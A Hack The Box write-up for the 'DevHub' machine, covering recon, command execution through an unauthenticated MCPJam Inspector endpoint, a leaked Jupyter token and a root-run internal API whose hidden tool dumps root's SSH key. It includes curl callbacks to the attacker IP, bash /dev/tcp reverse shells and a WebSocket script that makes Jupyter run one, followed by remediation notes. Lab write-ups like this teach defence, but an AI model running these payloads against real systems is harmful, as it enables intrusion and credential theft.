---
slug: "hackthebox/machines/htb-devhub"
event: "hack-the-box-machines"
title: "HTB DevHub Writeup"
summary: "Linux writeup covering web enumeration, Jupyter token exposure, API abuse, and privilege escalation."
date: 2026-06-05
tags:
  - htb
  - linux
  - web
  - jupyter
  - api
  - recon
category: "hack-the-box"
difficulty: "medium"
platform: "hackthebox"
boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8e821c7bbdb90d8520bb597edae70080.png"
draft: false
---
## Challenge Information

|Field|Value|
|---|---|
|Machine|DevHub|
|Platform|Hack The Box|
|Target IP|`[REDACTED_TARGET_IP]`|
|Attacker IP|`[REDACTED_VPN_IP]`|
|Operating System|Ubuntu 22.04.5 LTS|
|User Flag|`[REDACTED_FLAG]`|
|Root Flag|`[REDACTED_FLAG]`|

---

## 1. Reconnaissance

The target initially had unstable ICMP replies, so all scans were performed using `-Pn`.

```bash
export IP=[REDACTED_TARGET_IP]

sudo nmap -Pn -n -p- --min-rate 3000 $IP -oN full_ports.txt
```

Open ports found:

```text
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```

A service/version scan was then performed:

```bash
ports=$(grep -oP '^\d+(?=/tcp\s+open)' full_ports.txt | paste -sd, -)

sudo nmap -Pn -n -sCV -p$ports $IP -oN services.txt
```

Results:

```text
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp   open  http    nginx 1.18.0
6274/tcp open  http    MCPJam Inspector
```

Port `80` redirected to `devhub.htb`, so the hostname was added to `/etc/hosts`.

```bash
echo "[REDACTED_TARGET_IP] devhub.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration

Accessing the web application showed an internal development landing page.

```bash
curl -i http://devhub.htb/
```

The page revealed three internal services:

```text
MCP Inspector      Active - Port 6274
Analytics Dashboard Internal Only - localhost:8888
Code Repository    Maintenance Mode
```

The service on port `6274` returned an MCPJam Inspector web application.

```bash
curl -i http://[REDACTED_TARGET_IP]:6274/
```

The HTML loaded a JavaScript bundle:

```html
<script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
```

The bundle was downloaded for analysis.

```bash
curl -s http://[REDACTED_TARGET_IP]:6274/assets/index-DRYhT9Xb.js -o mcpjam.js
```

Extracting paths from the JavaScript showed several MCP API endpoints:

```bash
grep -Eo '"/[^"]+|http[^"]+' mcpjam.js | sort -u | tee js_paths.txt
```

Important endpoints included:

```text
/api/mcp/connect
/api/mcp/servers
/api/mcp/tools/list
/api/mcp/tools/execute
/api/mcp/resources/list
/api/mcp/resources/read
/api/mcp-cli-config
```

The server list endpoint was accessible without authentication.

```bash
curl -s http://$IP:6274/api/mcp/servers | jq
```

Output:

```json
{
  "success": true,
  "servers": []
}
```

---

## 3. Foothold as `mcp-dev`

The JavaScript showed that `/api/mcp/connect` accepted a JSON body containing `serverConfig` and `serverId`.

Relevant request structure:

```json
{
  "serverId": "name",
  "serverConfig": {
    "command": "command",
    "args": ["arguments"],
    "env": {}
  }
}
```

This indicated that MCPJam could start local STDIO-based MCP servers. By supplying a custom command, it was possible to execute commands on the target.

A callback test was sent first.

On Kali:

```bash
python3 -m http.server 8000
```

On the target API:

```bash
curl -s -i -X POST http://$IP:6274/api/mcp/connect \
-H 'Content-Type: application/json' \
--data-binary @- <<'JSON'
{
  "serverId":"poc",
  "serverConfig":{
    "command":"bash",
    "args":["-lc","curl http://[REDACTED_VPN_IP]:8000/$(id|base64 -w0)"],
    "env":{}
  }
}
JSON
```

The HTTP server received a callback containing base64 output.

Decoded output:

```bash
echo 'dWlkPTEwMDEobWNwLWRldikgZ2lkPTEwMDEobWNwLWRldikgZ3JvdXBzPTEwMDEobWNwLWRldikK' | base64 -d
```

Result:

```text
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

A reverse shell was then triggered.

On Kali:

```bash
nc -lvnp 4444
```

Payload:

```bash
curl -s -i -X POST http://$IP:6274/api/mcp/connect \
-H 'Content-Type: application/json' \
--data-binary @- <<'JSON'
{
  "serverId":"rev",
  "serverConfig":{
    "command":"bash",
    "args":["-lc","bash -i >& /dev/tcp/[REDACTED_VPN_IP]/4444 0>&1"],
    "env":{}
  }
}
JSON
```

Shell received:

```text
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

The shell was upgraded:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 4. Local Enumeration

Basic system checks confirmed the current user and OS.

```bash
whoami
id
hostname
uname -a
cat /etc/os-release
```

Output:

```text
mcp-dev
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
devhub
Ubuntu 22.04.5 LTS
```

Home directories:

```bash
ls -la /home
```

Output:

```text
drwxr-x---  9 analyst analyst 4096 May 27 12:22 analyst
drwxr-x---  4 mcp-dev mcp-dev 4096 May 27 12:22 mcp-dev
```

Listening services were checked.

```bash
ss -lntp
```

Important local services:

```text
127.0.0.1:8888  Jupyter Lab
127.0.0.1:5000  Internal Flask API
0.0.0.0:6274    MCPJam Inspector
```

The internal Flask API was probed.

```bash
curl -i http://127.0.0.1:5000/
curl -i http://127.0.0.1:5000/health
```

Output:

```json
{
  "auth": "Required - X-API-Key header",
  "endpoints": ["/tools/list", "/tools/call", "/health"],
  "server": "OPSMCP",
  "status": "operational",
  "version": "2.1.0"
}
```

---

## 5. Pivot to `analyst` via Jupyter

Process enumeration revealed that Jupyter was running as the `analyst` user and leaked the authentication token in its command-line arguments.

```bash
ps auxww | grep -Ei 'jupyter|python|flask|gunicorn|opsmcp' | grep -v grep
```

Relevant output:

```text
analyst 1078 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab \
--ip=127.0.0.1 \
--port=8888 \
--no-browser \
--notebook-dir=/home/analyst/notebooks \
--ServerApp.token=[REDACTED_TOKEN]
```

Token:

```text
[REDACTED_HASH]
```

Because the `mcp-dev` user could not execute `/home/analyst/jupyter-env/bin/python3`, a raw WebSocket client was written using the system Python standard library.

On Kali, a listener was started:

```bash
nc -lvnp 5555
```

On the target:

```bash
cat > /tmp/jup_raw.py <<'PY'
import json, uuid, datetime, urllib.request, socket, base64, os, struct

JUPYTER_AUTH="[redacted-jupyter-auth-value]"
LHOST="[REDACTED_VPN_IP]"
LPORT="5555"
HOST="127.0.0.1"
PORT=8888

req=urllib.request.Request(
 f"http://{HOST}:{PORT}/api/kernels?token={JUPYTER_AUTH}",
 data=b"{}",
 headers={"Content-Type":"application/json"},
 method="POST"
)
kid=json.loads(urllib.request.urlopen(req).read())["id"]
sid=str(uuid.uuid4())

path=f"/api/kernels/{kid}/channels?session_id={sid}&token={JUPYTER_AUTH}"
key=base64.b64encode(os.urandom(16)).decode()

s=socket.create_connection((HOST,PORT))
s.sendall(
 f"GET {path} HTTP/1.1\r\n"
 f"Host: {HOST}:{PORT}\r\n"
 "Upgrade: websocket\r\n"
 "Connection: Upgrade\r\n"
 f"Sec-WebSocket-Key: {key}\r\n"
 "Sec-WebSocket-Version: 13\r\n\r\n"
 .encode()
)

resp=s.recv(4096)
if b"101 Switching Protocols" not in resp:
 print(resp.decode(errors="ignore"))
 raise SystemExit

code=f'import subprocess;subprocess.Popen(["bash","-lc","bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"])'

msg={
 "header":{
  "msg_id":str(uuid.uuid4()),
  "username":"analyst",
  "session":sid,
  "date":datetime.datetime.utcnow().isoformat()+"Z",
  "msg_type":"execute_request",
  "version":"5.3"
 },
 "parent_header":{},
 "metadata":{},
 "content":{
  "code":code,
  "silent":False,
  "store_history":True,
  "user_expressions":{},
  "allow_stdin":False,
  "stop_on_error":True
 },
 "channel":"shell"
}

payload=json.dumps(msg).encode()
mask=os.urandom(4)
hdr=bytearray([0x81])
n=len(payload)

if n < 126:
 hdr.append(0x80 | n)
elif n < 65536:
 hdr += bytes([0x80 | 126]) + struct.pack(">H", n)
else:
 hdr += bytes([0x80 | 127]) + struct.pack(">Q", n)

masked=bytes(b ^ mask[i % 4] for i,b in enumerate(payload))
s.sendall(hdr + mask + masked)
print("[+] sent execute_request to Jupyter")
PY

python3 /tmp/jup_raw.py
```

A shell was received as `analyst`.

```text
analyst@devhub:~$
```

The user flag was read.

```bash
cat /home/analyst/[REDACTED_FLAG_PATH]
```

User flag:

```text
[REDACTED_HASH]
```

---

## 6. Privilege Escalation Enumeration

The internal OPSMCP service was running as root.

```bash
ps auxww | grep -Ei 'jupyter|python|flask|gunicorn|opsmcp' | grep -v grep
```

Relevant output:

```text
root 1087 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

The service file was readable by `analyst`.

```bash
ls -la /opt/opsmcp
cat /opt/opsmcp/server.py
```

Permissions:

```text
drwxr-xr-x 2 analyst analyst 4096 May 26 08:42 /opt/opsmcp
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
```

The source code revealed a hardcoded API key.

```python
VALID_API_KEY = "[REDACTED_API_KEY]"
```

It also contained hidden tools that were not shown in `/tools/list`.

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

The dangerous hidden function `ops._admin_dump` could read `/root/.ssh/id_rsa` when called with:

```json
{
  "target": "ssh_keys",
  "confirm": true
}
```

Relevant code:

```python
if target == "ssh_keys":
    with open('/root/.ssh/id_rsa', 'r') as f:
        key_data = f.read()
    return jsonify({
        "target": "ssh_keys",
        "root_private_key": key_data,
        "note": "Emergency recovery key dump"
    })
```

Because the Flask service was running as root, this endpoint could read the sensitive SSH material.

---

## 7. Root Access

The hidden tool was called using the hardcoded API key.

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
-H "Content-Type: application/json" \
-H "X-API-Key: [REDACTED_API_KEY]" \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
| python3 -c 'import sys,json; print(json.load(sys.stdin)["root_private_key"])' > /tmp/root_id_rsa

chmod 600 /tmp/root_id_rsa
```

The key was verified.

```bash
head -1 /tmp/root_id_rsa
```

Output:

```text
[REDACTED_PRIVATE_KEY]
```

The key was then used to SSH into localhost as root.

```bash
ssh -o StrictHostKeyChecking=no -i /tmp/root_id_rsa root@127.0.0.1 'id; cat /root/[REDACTED_FLAG_PATH]'
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
[REDACTED_HASH]
```

An interactive root shell was also obtained.

```bash
ssh -tt -o StrictHostKeyChecking=no -i /tmp/root_id_rsa root@127.0.0.1
```

Root flag:

```bash
cat /root/[REDACTED_FLAG_PATH]
```

```text
[REDACTED_HASH]
```

---

## 8. Attack Chain Summary

```text
1. Nmap discovered SSH, nginx, and MCPJam Inspector.
2. devhub.htb landing page disclosed internal services.
3. MCPJam Inspector exposed /api/mcp/connect.
4. /api/mcp/connect accepted arbitrary STDIO server command configuration.
5. Command execution gave shell as mcp-dev.
6. Local enumeration revealed Jupyter on 127.0.0.1:8888.
7. Jupyter token was leaked in process arguments.
8. Jupyter kernel WebSocket execution gave shell as analyst.
9. analyst could read /opt/opsmcp/server.py.
10. OPSMCP was running as root and had a hardcoded API key.
11. Hidden OPSMCP tool dumped /root/.ssh/id_rsa.
12. Root SSH key allowed login as root.
```

---

## 9. Flags

|Flag Type|Value|
|---|---|
|User|`[REDACTED_HASH]`|
|Root|`[REDACTED_HASH]`|

---

## 10. Remediation Notes

The compromise was caused by multiple chained misconfigurations:

1. **MCPJam command execution exposure**

    - The MCP Inspector allowed unauthenticated creation of STDIO-based MCP servers.

    - External users should not be able to define arbitrary commands.

2. **Jupyter token leakage**

    - Jupyter was started with the token in process arguments.

    - Secrets should not be passed through command-line arguments because local users can read them with `ps`.

3. **Sensitive local services**

    - Jupyter and OPSMCP were bound to localhost, but a low-privileged shell could still access them.

    - Localhost-only binding is not sufficient once any local user is compromised.

4. **Hardcoded OPSMCP API key**

    - The API key was stored directly in source code.

    - Secrets should be stored using a secure secret manager or protected environment files.

5. **Root service exposed dangerous hidden functionality**

    - OPSMCP ran as root and included a hidden function that could dump `/root/.ssh/id_rsa`.

    - Root services should follow least privilege and must not expose credential-dumping functionality.

6. **Weak file ownership model**

    - `/opt/opsmcp/server.py` was owned by `analyst` while being executed by root.

    - Root-executed service files should be owned by root and not writable by non-root users.


---

## 11. Cleanup

Temporary files created during exploitation:

```bash
rm -f /tmp/root_id_rsa /tmp/jup_raw.py /tmp/jup_exec.py
```

---
